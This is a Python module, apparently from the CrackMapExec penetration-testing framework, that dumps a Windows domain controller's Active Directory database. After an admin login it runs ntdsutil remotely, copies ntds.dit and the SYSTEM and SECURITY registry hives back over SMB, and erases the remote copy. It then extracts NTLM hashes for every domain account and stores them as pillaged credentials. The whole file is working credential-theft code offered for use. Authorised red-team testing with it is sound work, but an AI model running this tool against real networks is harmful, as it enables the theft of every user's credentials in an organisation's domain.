import os
import shutil
import tempfile
import time

from impacket.examples.secretsdump import LocalOperations, NTDSHashes

from cme.helpers.logger import highlight
from cme.helpers.misc import validate_ntlm


class CMEModule:
    """
    Dump NTDS with ntdsutil
    Module by @zblurx

    """

    name = "ntdsutil"
    description = "Dump NTDS with ntdsutil"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """
        Dump NTDS with ntdsutil
        Module by @zblurx

        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing
        """
        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.dump_location = str(time.time())[:9]
        self.dir_result = self.dir_result = tempfile.mkdtemp()
        self.no_delete = False

        if "DIR_RESULT" in module_options:
            self.dir_result = os.path.abspath(module_options["DIR_RESULT"])
            self.no_delete = True

    def on_admin_login(self, context, connection):
        command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
        context.log.display("Dumping ntds with ntdsutil.exe to %s%s" % (self.tmp_dir, self.dump_location))
        context.log.highlight("Dumping the NTDS, this could take a while so go grab a redbull...")
        context.log.debug("Executing command {}".format(command))
        p = connection.execute(command, True)
        context.log.debug(p)
        if "success" in p:
            context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
        else:
            context.log.fail("Error while dumping NTDS")
            return

        os.makedirs(self.dir_result, exist_ok=True)
        os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
        os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)

        context.log.display("Copying NTDS dump to %s" % self.dir_result)
        context.log.debug("Copy ntds.dit to host")
        with open(os.path.join(self.dir_result, "Active Directory", "ntds.dit"), "wb+") as dump_file:
            try:
                connection.conn.getFile(
                    self.share,
                    self.tmp_share + self.dump_location + "\\" + "Active Directory\\ntds.dit",
                    dump_file.write,
                )
                context.log.debug("Copied ntds.dit file")
            except Exception as e:
                context.log.fail("Error while get ntds.dit file: {}".format(e))

        context.log.debug("Copy SYSTEM to host")
        with open(os.path.join(self.dir_result, "registry", "SYSTEM"), "wb+") as dump_file:
            try:
                connection.conn.getFile(
                    self.share,
                    self.tmp_share + self.dump_location + "\\" + "registry\\SYSTEM",
                    dump_file.write,
                )
                context.log.debug("Copied SYSTEM file")
            except Exception as e:
                context.log.fail("Error while get SYSTEM file: {}".format(e))

        context.log.debug("Copy SECURITY to host")
        with open(os.path.join(self.dir_result, "registry", "SECURITY"), "wb+") as dump_file:
            try:
                connection.conn.getFile(
                    self.share,
                    self.tmp_share + self.dump_location + "\\" + "registry\\SECURITY",
                    dump_file.write,
                )
                context.log.debug("Copied SECURITY file")
            except Exception as e:
                context.log.fail("Error while get SECURITY file: {}".format(e))
        context.log.display("NTDS dump copied to %s" % self.dir_result)
        try:
            command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
            p = connection.execute(command, True)
            context.log.success("Deleted %s%s remote dump directory" % (self.tmp_dir, self.dump_location))
        except Exception as e:
            context.log.fail("Error deleting {} remote directory on share {}: {}".format(self.dump_location, self.share, e))

        localOperations = LocalOperations("%s/registry/SYSTEM" % self.dir_result)
        bootKey = localOperations.getBootKey()
        noLMHash = localOperations.checkNoLMHashPolicy()

        host_id = context.db.get_hosts(filter_term=connection.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            add_ntds_hash.ntds_hashes += 1
            if context.enabled:
                if "Enabled" in ntds_hash:
                    ntds_hash = ntds_hash.split(" ")[0]
                    context.log.highlight(ntds_hash)
            else:
                ntds_hash = ntds_hash.split(" ")[0]
                context.log.highlight(ntds_hash)
            if ntds_hash.find("$") == -1:
                if ntds_hash.find("\\") != -1:
                    domain, hash = ntds_hash.split("\\")
                else:
                    domain = connection.domain
                    hash = ntds_hash

                try:
                    username, _, lmhash, nthash, _, _, _ = hash.split(":")
                    parsed_hash = ":".join((lmhash, nthash))
                    if validate_ntlm(parsed_hash):
                        context.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except:
                    context.log.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                context.log.debug("Dumped hash is a computer account, not adding to db")

        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0

        NTDS = NTDSHashes(
            "%s/Active Directory/ntds.dit" % self.dir_result,
            bootKey,
            isRemote=False,
            history=False,
            noLMHash=noLMHash,
            remoteOps=None,
            useVSSMethod=True,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=connection.output_filename,
            justUser=None,
            printUserStatus=True,
            perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id),
        )

        try:
            context.log.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            context.log.success(
                "Dumped {} NTDS hashes to {} of which {} were added to the database".format(
                    highlight(add_ntds_hash.ntds_hashes),
                    connection.output_filename + ".ntds",
                    highlight(add_ntds_hash.added_to_db),
                )
            )
            context.log.display("To extract only enabled accounts from the output file, run the following command: ")
            context.log.display("grep -iv disabled {} | cut -d ':' -f1".format(connection.output_filename + ".ntds"))
        except Exception as e:
            context.log.fail(e)

        NTDS.finish()

        if self.no_delete:
            context.log.display("Raw NTDS dump copied to %s, parse it with:" % self.dir_result)
            context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds "%s/Active Directory/ntds.dit" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))
        else:
            shutil.rmtree(self.dir_result)
